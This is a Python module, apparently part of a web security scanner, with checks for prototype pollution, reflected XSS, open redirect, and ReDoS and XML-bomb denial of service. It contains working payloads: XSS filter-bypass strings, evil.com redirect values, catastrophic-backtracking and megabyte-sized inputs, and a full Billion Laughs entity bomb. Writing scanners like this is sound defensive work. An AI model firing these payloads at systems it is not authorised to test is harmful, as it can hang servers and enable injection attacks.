from typing import Any, Dict
from ..http_client import HttpClient
from ..scenarios import SimpleScenario
import urllib.parse

def run_prototype_pollution(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Checks for Prototype Pollution in JSON bodies or Query Params.
    Payload: __proto__[polluted] = "true"
    Detection: Unreliable without server-side reflection, but we check specific nuances.
    """
    payloads = [
        {"__proto__": {"polluted": "true"}},
        {"constructor": {"prototype": {"polluted": "true"}}}
    ]
    
    issues = []
    
    for payload in payloads:
        # 1. Send Pollution
        client.send(scenario.method, scenario.target, json_body=payload)
        
        # 2. Check for symptoms (very hard in blackbox without crashing)
        # We might check if the server crashes (500) on subsequent requests or if logic changes.
        # But specifically, let's look for reflection of the polluted key if possible.
        
        # A simple valid check is to see if the payload itself caused a 500 error (often means unhandled merge)
        resp = client.send(scenario.method, scenario.target, json_body=payload)
        if resp.status_code == 500:
             issues.append("Possible Prototype Pollution (Server Error 500 on Prototype Injection)")
             
    passed = len(issues) == 0
    return {
        "scenario_id": scenario.id,
        "attack_type": "prototype_pollution",
        "passed": passed,
        "details": issues if not passed else "No immediate crash/error observed."
    }

def run_xss_scan(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Checks if script tags are returned unescaped.
    """
    payloads = [
        # 1. Standard Script Tags
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        
        # 2. Event Handlers (Bypass <script> filters)
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        
        # 3. Protocol Wrappers
        "javascript:alert(1)",
        
        # 4. Polyglots (The "Kitchen Sink")
        "javascript://%250Aalert(1)//",
        "'-alert(1)-'",
        "\";alert(1)//"
    ]
    
    fields = scenario.config.get("fields", ["q", "search", "name"])
    issues = []
    leaked_data = [] # Data context
    
    for field in fields:
        for p in payloads:
            # Query Param Injection
            qs = {field: p}
            resp = client.send("GET", scenario.target, params=qs)
            if p in resp.text:
                 issues.append(f"Reflected XSS in param '{field}' with payload: {p}")
                 # Capture snippet where reflection happened
                 idx = resp.text.find(p)
                 snippet = resp.text[max(0, idx-20):min(len(resp.text), idx+len(p)+20)]
                 leaked_data.append(f"Reflected Snippet: ...{snippet}...")
                 break # Found one for this field
                 
            # Body Injection (if POST)
            if scenario.method == "POST":
                resp_post = client.send("POST", scenario.target, json_body={field: p})
                if p in resp_post.text:
                    issues.append(f"Reflected XSS in JSON field '{field}'")
                    idx = resp_post.text.find(p)
                    snippet = resp_post.text[max(0, idx-20):min(len(resp_post.text), idx+len(p)+20)]
                    leaked_data.append(f"Reflected Snippet: ...{snippet}...")
                    break

    passed = len(issues) == 0
    
    return {
        "scenario_id": scenario.id,
        "attack_type": "xss",
        "passed": passed,
        "details": {"found": issues, "leaked_data": leaked_data} if not passed else "No XSS reflection found."
    }

def run_open_redirect(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Checks for Open Redirect Vulnerabilities.
    """
    payloads = [
        "http://evil.com",
        "//evil.com",
        "https://google.com"
    ]
    fields = scenario.config.get("fields", ["next", "url", "redirect", "returnTo"])
    issues = []
    leaked_data = []
    
    for field in fields:
        for p in payloads:
            qs = {field: p}
            # prevent auto-redirect to capture the 3xx header
            resp = client.send("GET", scenario.target, params=qs) 
            
            # Check headers manual (HttpClient follows redirects by default? 
            # We implemented allow_redirects=False logic in Engine? No.
            # HttpClient uses requests.Session().request which follows by default.
            # We should probably check the history or final URL if it followed.
            
            # If we ended up at evil.com (or google)
            if "google.com" in resp.url or "evil.com" in resp.url:
                 issues.append(f"Open Redirect found in '{field}' -> {resp.url}")
                 leaked_data.append(f"Redirected To: {resp.url}")
                 break

    passed = len(issues) == 0
    return {
        "scenario_id": scenario.id,
        "attack_type": "open_redirect",
        "passed": passed,
        "details": {"issues": issues, "leaked_data": leaked_data} if not passed else "No open redirects found."
    }

def run_advanced_dos(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Checks for Application-Layer DoS (ReDoS, XML Bomb).
    WARNING: This can hang the server processing thread.
    """
    issues = []
    
    issues = []
    
    # 1. ReDoS (Regular Expression Denial of Service)
    # Common triggers: Email validators, URL validators
    redos_payloads = [
        # The Classic Email ReDoS
        "a" * 10000 + "@a.com",
        "a" * 10000 + "!",
        # URL Regex ReDoS
        "http://" + "a" * 10000 + ".com",
        # Catastrophic Backtracking Generic
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
        "((a)+)+" + "!", # Exponential Backtracking (CPU Killer)
        "a" * 100000, # Large String (Memory Stress)
    ]
    
    # Aggressive: Mega-Payloads for Resource Exhaustion
    if scenario.config.get("aggressive"):
        print("    [!!!] Using MEGA-PAYLOADS for ReDoS/Memory Exhaustion...")
        redos_payloads.append("A" * 1000000) # 1MB String (Memory/JSON Parser Stress)
        redos_payloads.append("1" * 1000000) # Integer/Number parser stress
    
    # 2. XML Bomb (Billion Laughs)
    # Only works if endpoint accepts XML (we check heuristically)
    xml_bomb = """<?xml version="1.0"?>
    <!DOCTYPE lolz [
     <!ENTITY lol "lol">
     <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
     <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
     <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
     <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
     <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
     <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
     <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
     <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    ]>
    <lolz>&lol9;</lolz>"""

    # Execution Loop
    fields = scenario.config.get("fields", ["email", "url", "comment", "body"])
    
    import time
    
    # Check ReDoS if fields exist
    for field in fields:
        for p in redos_payloads:
            start = time.time()
            try:
                # 5-second timeout. If it hangs, we might have hit it.
                client.send(scenario.method, scenario.target, json_body={field: p}, timeout=5.0)
            except Exception: 
                pass
            
            duration = time.time() - start
            if duration > 4.5: # If it timed out or took very long
                 issues.append(f"ReDoS Vulnerability/Hang in '{field}' (Time: {duration:.2f}s)")

    # Check XML Bomb (only if method allows body)
    if scenario.method in ["POST", "PUT"]:
        start = time.time()
        try:
             client.send(scenario.method, scenario.target, form_body=xml_bomb, headers={"Content-Type": "application/xml"}, timeout=5.0)
        except: pass
        
        duration = time.time() - start
        if duration > 4.5:
            issues.append("XML Bomb (Billion Laughs) Processing Detected (Hang/Timeout)")

    return {
        "scenario_id": scenario.id,
        "attack_type": "advanced_dos",
        "passed": len(issues) == 0,
        "details": {"issues": issues} if issues else "No DoS vulnerabilities detected."
    }
